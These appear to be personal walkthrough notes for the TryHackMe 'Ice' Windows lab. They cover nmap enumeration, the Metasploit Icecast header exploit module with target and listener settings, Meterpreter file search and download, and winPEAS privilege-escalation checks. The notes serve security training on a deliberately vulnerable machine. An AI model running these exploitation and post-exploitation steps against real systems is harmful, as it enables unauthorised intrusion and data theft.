🔵 Ice - Notes

📝 Information

    Platform: TryHackMe
    OS: Windows
    Difficulty: Easy
    Main Vulnerabilities: Icecast / Remote Code Execution / Windows Privilege Escalation

🔎 Enumeration

Nmap

First, scan the target to identify open ports and services.

Command:

nmap -sC -sV -oN scan.txt MACHINE_IP

Important ports:

135/tcp   MSRPC
139/tcp   NetBIOS
445/tcp   SMB
3389/tcp  RDP
8000/tcp  Icecast

Important findings:

    Windows machine detected.
    Icecast service exposed on port 8000.
    Possible vulnerable application running.

🌐 Icecast Enumeration

Access the service:

http://MACHINE_IP:8000

Identify:

    Icecast version.
    Running services.
    Possible vulnerabilities.

Search for known vulnerabilities:

searchsploit icecast

Important:

    Icecast versions may contain remote code execution vulnerabilities.

💥 Exploitation

Main vulnerability:

    Icecast Server Remote Code Execution

Metasploit:

msfconsole

Search exploit:

search icecast

Use module:

use exploit/windows/http/icecast_header

Configuration:

set RHOSTS MACHINE_IP
set RPORT 8000
set LHOST YOUR_IP
run

After exploitation:

Meterpreter session obtained.

Check access:

getuid

Expected:

NT AUTHORITY\SYSTEM

🖥️ Post Exploitation

System information:

sysinfo

Current user:

getuid

Check processes:

ps

Find useful information:

search -f flag*

Download files:

download FILE_PATH

🔼 Privilege Escalation

If the initial shell is not SYSTEM:

Check privileges:

whoami /priv

Enumerate:

    Installed applications.
    Services.
    Scheduled tasks.
    Stored credentials.

Useful tool:

winPEAS

Command:

winpeas.exe

Look for:

    Weak service permissions.
    Unquoted service paths.
    Stored passwords.

🚩 Flags Location

User:

C:\Users\USERNAME\Desktop\user.txt

Root:

C:\Users\Administrator\Desktop\root.txt

🧠 Key Takeaways

    Always enumerate unusual ports and services.
    Check software versions against known vulnerabilities.
    Icecast can provide remote code execution through vulnerable versions.
    Meterpreter simplifies Windows post-exploitation.
    After gaining access, always search for privilege escalation paths.
